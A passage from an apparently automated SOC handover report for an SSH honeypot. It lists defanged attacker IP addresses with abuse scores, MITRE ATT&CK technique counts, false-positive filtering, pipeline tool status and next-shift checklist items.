| `83.239.108[.]218` | RU | OJSC Rostelecom Macroregional Branch South | **100** ⚠️ | 50 |
| `186.235.193[.]170` | BR | VERO S.A | **100** ⚠️ | 43 |
| `185.255.212[.]178` | BG | BG-KARNOBATNET | **100** ⚠️ | 50 |
| `81.23.173[.]32` | RU | MTS PJSC | **100** ⚠️ | 50 |
| `58.57.154[.]146` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 44 |
| `83.191.176[.]93` | SE | SE TELE2 BROADBAND | **100** ⚠️ | 14 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 30 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 17 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 36 cases |
| Tool 34  | Credential Extractor        | ✅ 28 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (13.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 26 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 9 priority case(s) shown individually · 22 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-05T07:03:25Z_
